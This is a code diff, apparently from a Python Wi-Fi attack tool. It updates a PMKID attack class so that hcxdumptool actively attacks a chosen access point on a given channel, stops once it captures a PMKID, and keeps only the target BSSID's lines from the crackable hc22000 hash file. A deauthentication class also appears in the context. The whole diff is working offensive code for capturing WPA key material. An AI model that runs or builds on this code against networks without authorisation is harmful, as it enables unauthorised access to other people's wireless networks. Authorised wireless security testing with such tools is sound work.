@@ -46,6 +46,18 @@ def _run(cmd, timeout=30):
         return "", f"{cmd[0]} not found", 127
 
 
+def _hcxdumptool_channel_spec(channel):
+    """Build hcxdumptool's -c argument (channel + band letter).
+
+    hcxdumptool >= 6.x requires a band suffix since channel numbers
+    aren't unique across bands (e.g. channel 36 exists on both 5GHz
+    and 6GHz). We only need to disambiguate the common 2.4/5GHz case
+    here; band letters per `hcxdumptool -h`: a=2.4GHz, b=5GHz.
+    """
+    band = "a" if channel <= 14 else "b"
+    return f"{channel}{band}"
+
+
 class Deauth:
     def __init__(self, interface, bssid, client=None, count=10):
         self.interface = interface
@@ -610,18 +622,19 @@ class PMKIDAttack:
         start = time.time()
         pcapng_file = os.path.join(self.output_dir, "pmkid.pcapng")
 
-        filter_file = os.path.join(self.output_dir, "filter.txt")
-        with open(filter_file, "w") as f:
-            bssid_clean = self.bssid.replace(":", "").lower()
-            f.write(f"{bssid_clean}\n")
-
         cmd = [
             "hcxdumptool",
             "-i", self.interface,
-            "-o", pcapng_file,
-            "--filterlist_ap=" + filter_file,
-            "--filtermode=2",
-            "--enable_status=1",
+            "-w", pcapng_file,
+            "-c", _hcxdumptool_channel_spec(self.channel),
+            "--rds=1",
+            # default is 4 - hcxdumptool gives up actively attacking an AP
+            # after that many BEACONs with no result, which is nowhere near
+            # enough time to complete an association attempt against it.
+            "--attemptapmax=300",
+            # stop as soon as we get what we came for instead of running
+            # the full timeout (bit 1 = PMKID from AP).
+            "--exitoneapol=1",
         ]
 
         self._process = subprocess.Popen(
@@ -654,11 +667,27 @@ class PMKIDAttack:
                 duration=time.time() - start,
             )
 
-        hash_file = os.path.join(self.output_dir, "pmkid.hc22000")
-        convert_cmd = ["hcxpcapngtool", "-o", hash_file, pcapng_file]
+        # hcxdumptool no longer supports AP-list capture filtering
+        # (--filterlist_ap/--filtermode were removed); convert the whole
+        # capture, then keep only the hash line(s) for our target BSSID.
+        hash_file_all = os.path.join(self.output_dir, "pmkid_all.hc22000")
+        convert_cmd = ["hcxpcapngtool", "-o", hash_file_all, pcapng_file]
         stdout, _, rc = _run(convert_cmd, timeout=30)
 
-        if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
+        hash_file = os.path.join(self.output_dir, "pmkid.hc22000")
+        bssid_clean = self.bssid.replace(":", "").lower()
+        matched = []
+        if os.path.exists(hash_file_all):
+            with open(hash_file_all) as f:
+                for line in f:
+                    # hc22000 format: WPA*02*PMKID*AP_MAC*STA_MAC*ESSID_hex***
+                    fields = line.strip().split("*")
+                    if len(fields) > 3 and fields[3].lower() == bssid_clean:
+                        matched.append(line)
+
+        if matched:
+            with open(hash_file, "w") as f:
+                f.writelines(matched)
             return AttackResult(
                 success=True, attack_type="pmkid",
                 target_bssid=self.bssid, target_essid=self.essid,
